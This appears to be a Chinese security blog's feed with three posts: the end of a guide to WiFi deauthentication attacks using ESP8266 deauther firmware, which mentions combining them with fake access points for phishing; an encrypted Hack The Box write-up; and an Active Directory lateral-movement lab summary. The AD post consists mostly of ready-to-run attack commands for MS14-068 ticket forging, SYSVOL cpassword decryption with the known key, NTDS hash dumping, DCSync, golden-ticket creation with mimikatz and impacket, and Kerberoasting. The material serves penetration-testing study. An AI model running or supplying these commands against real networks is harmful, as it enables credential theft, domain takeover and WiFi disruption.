DownloadTool，选择bin，然后根据下图设置。之后烧录，烧录成功如下图<br><img src="https://s1.ax1x.com/2020/04/11/GHDXT0.png" alt=""></p><p>等待一会拔掉ESP8266重新接上去，会多出一个zhangguanzhang的SSID名<br><img src="https://s1.ax1x.com/2020/04/11/GHr10I.png" alt=""></p><p>密码也是：zhangguanzhang</p><p>连接上去后，访问192.168.4.1，点击扫描，出现如下图<br><img src="https://s1.ax1x.com/2020/04/11/GHrsA0.png" alt=""></p><p>选中wifi（漏截图了，借图一用）<br><img src="https://s1.ax1x.com/2020/04/11/GHr74K.png" alt=""></p><p>然后点击(攻击-&gt;deauth-&gt;开始)<br><img src="https://s1.ax1x.com/2020/04/11/GHrb9O.png" alt=""></p><p>成功之后和mdk4攻击wifi的效果一样。wifi连不上，可以配合wifi伪造来钓鱼</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://forum.90sec.com/t/topic/917" target="_blank" rel="noopener">利用硬件，拿走你家wifi，没商量 - 技术文章 - 90Sec</a><br><a href="https://tieba.baidu.com/p/5613315808?red_tag=0244813551" target="_blank" rel="noopener">刚买的这块esp8266,用串口连接，蓝灯一闪而过，电脑连串口都检测不到，是什么原因，求助<em>esp8266吧</em>百度贴吧</a></p>]]></content>
      
      
        <tags>
            
            <tag> 极客 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box  Remote</title>
      <link href="/posts/46f0d757.html"/>
      <url>/posts/46f0d757.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>域渗透横向实验总结</title>
      <link href="/posts/ae9f46f5.html"/>
      <url>/posts/ae9f46f5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搞域横向的时候，实验记录了一波<br>参考链接：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md" target="_blank" rel="noopener">PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>利用条件：</p><ul><li>域SID</li><li>域用户</li><li>域用户凭证</li></ul><pre><code>工具：msf模块:auxiliary/admin/kerberos/ms14_068_kerberos_checksumgithub：https://github.com/SecWiki/windows-kernel-exploitsmsf:Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum   Name      Current Setting                                Required  Description   ----      ---------------                                --------  -----------   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL   PASSWORD  P@ssw0rd                                       yes       The Domain User password   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier   RPORT     88                                             yes       The target port   Timeout   10                                             yes       The TCP timeout to establish connection and read data   USER      lambda                                         yes       The Domain User   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000ms14-068.py:# Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek$ git clone https://github.com/SecWiki/windows-kernel-exploits$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066-1105  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!  [+] Creating ccache file &#39;TGT_user01@metasploitable.local.ccache&#39;... Done!mimikatz导入生成的凭证（mimikatz得用本地管理员权限启动，导入才能生效）mimikatz.exe &quot;kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache&quot; &quot;exit&quot;验证是否成功：dir \\&lt;域控名称&gt;\C$ #主机名.域名</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDVh7Q.png" alt=""></p><h2 id="搜索smb里的SYSVOL"><a href="#搜索smb里的SYSVOL" class="headerlink" title="搜索smb里的SYSVOL"></a>搜索smb里的SYSVOL</h2><pre><code class="text">Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\.findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\*解密：echo &#39;password_in_base64&#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000e.g:echo &#39;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=&#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000echo &#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDZZAH.png" alt=""></p><h2 id="GPO横向"><a href="#GPO横向" class="headerlink" title="GPO横向"></a>GPO横向</h2><p>没有成功</p><h2 id="ntdsutil可被访问"><a href="#ntdsutil可被访问" class="headerlink" title="ntdsutil可被访问"></a>ntdsutil可被访问</h2><p>（若是在共享文件夹，或者可以被访问到的话，可以获取所有hash）</p><pre><code>创建ntdsutil备份文件ntdsutil &quot;activate instance ntds&quot; &quot;ifm&quot; &quot;create full C:\ntdsutil.bak&quot; &quot;quit&quot; &quot;quit&quot; or ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q qesentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit导出HASHroot@kali:~/impacket/examples# python secretsdump.py -ntds /root/Desktop/ntdsutil.bak/Active\ Directory/ntds.dit -system /root/Desktop/ntdsutil.bak/registry/SYSTEM LOCAL</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDZO2t.png" alt=""></p><h2 id="当前用户是某个管理员组"><a href="#当前用户是某个管理员组" class="headerlink" title="当前用户是某个管理员组"></a>当前用户是某个管理员组</h2><p>管理员、域管理员或企业管理员的任何成员以及域控制器计算机帐户都可以运行DCSync来提取密码数据<br>当发现用户组是下面的其中一个的都可以这么干：<br>（或者一个用户同时具有GetChanges和GetChangesAll权限）</p><pre><code>Administrators, Domain Admins, or Enterprise Admins</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDmWnK.md.png" alt=""></p><h2 id="黄金票据权限提升"><a href="#黄金票据权限提升" class="headerlink" title="黄金票据权限提升"></a>黄金票据权限提升</h2><p>条件：</p><ul><li>需要krbtgt NTLM散列</li></ul><p>利用方法：</p><pre><code>mimikatz：lsadump::dcsync /user:krbtgt #获取krbtgt的hashlsadump::lsa /inject /name:krbtgt# Forge a Golden ticket - Mimikatzkerberos::purge #查看当前的kerberos凭证kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /pttkerberos::golden /user:&lt;伪造的用户名&gt; /domain:&lt;目标域&gt; /sid:&lt;用户SID&gt; /krbtgt:&lt;krbtgt的hash&gt; /ticket:&lt;伪造的用户名&gt;.tck /ptt #生成并导入伪造的凭证kerberos::tgt #票据查询在meterpreter上伪造金票# Get info - Meterpreter(kiwi)dcsync_ntlm krbtgtdcsync krbtgt# Forge a Golden ticket - Meterpreterload kiwigolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tckkerberos_ticket_purgekerberos_ticket_use /root/Downloads/pentestlabuser.tckkerberos_ticket_listLinux生成金票票据凭据# Convert the ticket kirbi to ccache with kekeomisc::convert ccache ticket.kirbi# Alternatively you can use ticketer from Impacket./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-daticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519export KRB5CCNAME=/home/user/ticket.ccachecat $KRB5CCNAME# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDnEHU.png" alt=""></p><h2 id="SPN服务票据请求"><a href="#SPN服务票据请求" class="headerlink" title="SPN服务票据请求"></a>SPN服务票据请求</h2><p>任何有效的域用户都可以使用GetUserSPNs为任何域服务请求kerberos票证（TGS）。一旦接收到票证，就可以在票证上脱机进行密码破解，以尝试破解服务以何种用户身份运行的密码。<br>（任何域用户都可以通过GetUserSPNs获取服务票据，随后可利用join破解凭证获取明文）</p><pre><code>python GetUserSPNs.py  